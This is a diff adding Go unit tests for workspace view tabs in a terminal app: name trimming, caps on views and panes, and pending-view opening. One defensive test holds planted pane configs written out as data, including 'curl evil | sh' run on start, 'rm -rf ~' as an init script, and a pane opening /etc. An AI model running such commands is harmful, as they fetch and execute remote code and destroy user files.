@@ -8,6 +8,7 @@ import (
 	"testing"
 
 	"github.com/wavetermdev/waveterm/pkg/molten/viewpin"
+	"github.com/wavetermdev/waveterm/pkg/waveobj"
 	"github.com/wavetermdev/waveterm/pkg/wconfig"
 )
 
@@ -93,5 +94,76 @@ func TestWorkspaceViewTabs(t *testing.T) {
 	}
 	if len(workspaceViewTabs(nil)) != 0 {
 		t.Fatalf("an empty template gives no view")
+	}
+}
+
+func TestWorkspaceViewTabsLimits(t *testing.T) {
+	tabs := workspaceViewTabs([]wconfig.NewWorkspaceViewType{
+		{Name: "   ", NameKey: "settings.title", Panels: []string{"terminal"}},
+		{Name: "  Spec  ", Panels: []string{"terminal"}},
+	})
+	if tabs[0].Name != DefaultViewNameKey || tabs[0].Meta[ViewNameKeyMetaKey] != DefaultViewNameKey {
+		t.Fatalf("a blank name and a key outside the view names read as the default key: %+v", tabs[0])
+	}
+	if tabs[1].Name != "Spec" {
+		t.Fatalf("a typed name is trimmed: %q", tabs[1].Name)
+	}
+	many := make([]wconfig.NewWorkspaceViewType, MaxWorkspaceViews+5)
+	for i := range many {
+		many[i] = wconfig.NewWorkspaceViewType{Panels: []string{"terminal", "terminal", "terminal", "terminal", "terminal", "terminal", "terminal", "terminal", "terminal", "terminal"}}
+	}
+	tabs = workspaceViewTabs(many)
+	if len(tabs) != MaxWorkspaceViews {
+		t.Fatalf("views capped: %d", len(tabs))
+	}
+	cfg, _ := WorkspaceViewConfig(many[0].Panels)
+	if len(cfg.Panes) != MaxWorkspaceViewPanes {
+		t.Fatalf("panels capped: %d", len(cfg.Panes))
+	}
+}
+
+func pendingTab(t *testing.T, panels []string) *waveobj.Tab {
+	t.Helper()
+	tabs := workspaceViewTabs([]wconfig.NewWorkspaceViewType{{NameKey: "workspaceViews.names.scoping", Panels: panels}})
+	return &waveobj.Tab{OID: "t", Name: tabs[0].Name, Meta: tabs[0].Meta}
+}
+
+func TestPendingViewConfig(t *testing.T) {
+	tab := pendingTab(t, []string{"agent", "browser", "files"})
+	cfg, build := pendingViewConfig(tab)
+	if !build || len(cfg.Panes) != 3 {
+		t.Fatalf("a template view opens: %+v %v", cfg, build)
+	}
+	built := pendingTab(t, []string{"terminal"})
+	built.BlockIds = []string{"b1"}
+	if _, build := pendingViewConfig(built); build {
+		t.Fatalf("a view with panels is not opened again")
+	}
+	done := pendingTab(t, []string{"terminal"})
+	delete(done.Meta, ViewPendingMetaKey)
+	if _, build := pendingViewConfig(done); build {
+		t.Fatalf("a view no longer pending is not opened")
+	}
+	unpinned := pendingTab(t, []string{"terminal"})
+	delete(unpinned.Meta, viewpin.PinMetaKey)
+	if _, build := pendingViewConfig(unpinned); build {
+		t.Fatalf("only a view pinned in its workspace opens on its own")
+	}
+}
+
+// #1305 review: tab meta is writable from a terminal, and a pending view opens without a click.
+func TestPendingViewConfigRefusesPlantedPanels(t *testing.T) {
+	planted := []map[string]any{
+		{"view": "term", "controller": "cmd", "cmd": "curl evil | sh", "cmd:runonstart": true},
+		{"view": "term", "controller": "shell", "cmd:initscript": "rm -rf ~"},
+		{"view": "molten-browser", "url": "https://evil.example"},
+		{"view": "preview", "file": "/etc"},
+	}
+	for _, pane := range planted {
+		tab := pendingTab(t, []string{"terminal"})
+		tab.Meta[viewpin.PinConfigMetaKey] = map[string]any{"tree": map[string]any{"pane": 0}, "panes": []any{pane}}
+		if _, build := pendingViewConfig(tab); build {
+			t.Fatalf("a planted panel opened: %v", pane)
+		}
 	}
 }
